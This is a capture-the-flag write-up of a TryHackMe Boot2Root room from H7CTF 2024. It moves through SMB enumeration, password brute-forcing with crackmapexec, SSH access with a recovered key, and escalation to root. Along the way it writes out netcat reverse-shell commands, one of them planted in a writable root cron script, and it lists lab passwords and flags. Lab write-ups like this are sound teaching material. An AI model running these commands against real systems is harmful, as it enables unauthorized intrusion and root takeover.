---
title: Boot2Root
date: 2024-09-27
author: 1byteBoy
tags:
  - Boot2Root
draft: false
---

The CTF Event has Boot2Root as a part of the challenge category, which was hosted on [TryHackMe](https://tryhackme.com/r/room/h7ctf2024).
The Room has three tasks, which was three challenges for the main CTF under Boot2Root category. Each flag we get for the task is a flag for each of those challenges 

## Task 1 : Initial Access

### Enumeration

```
PORT      STATE  SERVICE        REASON         VERSION
22/tcp    closed ssh            reset ttl 61
139/tcp   open   netbios-ssn    syn-ack ttl 61 Samba smbd 4.6.2
445/tcp   open   netbios-ssn    syn-ack ttl 61 Samba smbd 4.6.2
44444/tcp closed cognex-dataman reset ttl 61
54321/tcp open   ssh            syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
54322/tcp closed unknown        reset ttl 61
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see SMB and SSH is up and SSH is running on port `54321`.

#### SMB Enumeration

Using `smbclient` i was able to list the available shares, but they are not accessible without any authentication.

```
$ smbclient --no-pass -L //10.10.117.5

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
IPC$            IPC       IPC Service (h7tex server (Samba, Ubuntu))
admin           Disk      I am the Admin
share           Disk      Samba on Ubuntu
ILoveYou        Disk      Someone once said Love is blind
```

Username enumeration using `enum4linux` through RID Cycling

```
$ enum4linux -a $IP

....
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\megatron (Local User)
S-1-22-1-1001 Unix User\optimus (Local User)
S-1-22-1-1002 Unix User\h7tex (Local User)

[+] Enumerating users using SID S-1-5-21-3984610305-3208475025-1872719784 and logon username '', password ''

S-1-5-21-3984610305-3208475025-1872719784-501 H7TEX\nobody (Local User)
S-1-5-21-3984610305-3208475025-1872719784-513 H7TEX\None (Domain Group)
S-1-5-21-3984610305-3208475025-1872719784-1000 H7TEX\megatron (Local User)
```

From the Task 1 description we also get the similar name `megatron` and also a password hint 

```
The Hint :

He deployed a password mechanism for sharing the files. He took a word from a small SMB article in Wikipedia, reversed it and put it in our CTF Flag format. 
```

Note : There are two SMB Wikipedia articles

- https://en.wikipedia.org/wiki/Server_Message_Block
- https://en.wikipedia.org/wiki/SMB 

We were stuck for a long time on the first on but later figured out, if we go with the second one which was intended, it will take much less time

So for creating the wordlist we can use a tool called `cewl`

```
cewl --depth 1 https://en.wikipedia.org/wiki/SMB -w passwords.txt
```

Next let's reverse the words and put it in the flag format, we can do that using the following shell command

```bash
cat passwords.txt | rev | xargs -I@ sh -c 'echo H7CTF{@}' | tee revPass.txt
```

Now let's bruteforce the password using `crackmapexec`

```bash
crackmapexec smb 10.10.155.25 -u megatron -p revPass.txt --shares
```

Source of help for using crackmapexec : [Reddit](https://www.reddit.com/r/kali4noobs/comments/tatllp/smb_brute_forcing/)

After waiting for a few minutes we get the password

```
SMB         10.10.155.25    445    H7TEX            [+] H7TEX\megatron:H7CTF{noitaugibmasiD} 
SMB         10.10.155.25    445    H7TEX            [+] Enumerated shares
SMB         10.10.155.25    445    H7TEX            Share           Permissions     Remark
SMB         10.10.155.25    445    H7TEX            -----           -----------     ------
SMB         10.10.155.25    445    H7TEX            print$          READ            Printer Drivers
SMB         10.10.155.25    445    H7TEX            IPC$                            IPC Service (h7tex server (Samba, Ubuntu))
SMB         10.10.155.25    445    H7TEX            admin           READ            I am the Admin
SMB         10.10.155.25    445    H7TEX            share           READ            Samba on Ubuntu
SMB         10.10.155.25    445    H7TEX            ILoveYou        READ            Someone once said Love is blind
```

Using the credentials and domain information we can list those three shares

```bash
smbclient //<IP>/<share> -U megatron -W H7CTF
```

Among those three shares, we got a RSA key from the `ILoveYou` share encoded in base64 in a file named `oveletter.txt` 

```bash
cat loveletter.txt | base64 -d | tee megatron_id_rsa && chmod 600 megatron_id_rsa 
```

Now we can login through SSH as user megatron, using the RSA key and get initial access to the system.

```bash
ssh -i megatron_id_rsa megatron@10.10.155.25 -p 54321
```

----

After logging in as megatron, we get the first flag from a file named `txt.galf`, but it was in reverse 

```bash
megatron@h7tex:~$ cat txt.galf | rev

H7CTF{HUM4N5_D0n’7_d3S3R73_T0_L1v3}
```

## Task 2 : System Enumeration

we also get the password of the user `megatron` from the `.secret` file

```
megatron password: Un1v3rse#!S@M1%E
```

Using the password, the first thing i checked is for the available sudo permissions

```
megatron@h7tex:~$ sudo -l
[sudo] password for megatron: 
Matching Defaults entries for megatron on h7tex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User megatron may run the following commands on h7tex:
    (optimus : optimus) /home/optimus/nc
```

We can run `netcat` as user optimus and get a shell back on our attacking machine

```
# on host run a netcat listener

nc -lvnp 1337

# on Target machine run

sudo -u optimus /home/optimus/nc -e /bin/bash <tun0_IP> 1337
```

After getting a shell as user `optimus`, we can grab the private RSA key from the home directory and login using SSH for stable shell but wait there is still one more step, we need the passphrase for the RSA key. 

At this point we can either create our own KEY pair and add the public key to `authorized_keys` file or crack it.

I did the first one but also cracked it later. The passphrase after cracking was `alianzalima`.

After loggin in we get the second flag in `flalalalalalag.txt` file : `H7CTF{3ALL1NG_4LL_AUT0B0T5}`

## Task 3 : Pwn Root

After enumerating the system for a bit, basically using [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), we found a crontab entry running as root

```
*  *    * * *   root    /home/h7tex/random.sh
```

Also the file has group access to `optimous` and has read and `write` permission, so the basic thing we can do without messing with the server is getting a netcat shell access

```bash
#!/bin/bash

random_action(){
        case $((RANDOM % 2)) in
        0) touch "/root/random/file_$(date +%s).txt";;
        1) ls > /dev/null 2>&1 ;;
        esac
}

/home/optimus/nc -e /bin/sh 10.4.83.105 1337 # the netcat rev shell
random_action
```

After waiting for few seconds we get a netcat connection back, with our root shell, where we can find the file `root156743232567826873451954.txt` which contains our last and final flag `H7CTF{r00T_1s_G0d_4nD_K1Ng}`

---

#### H7CTF 2024 PWNED


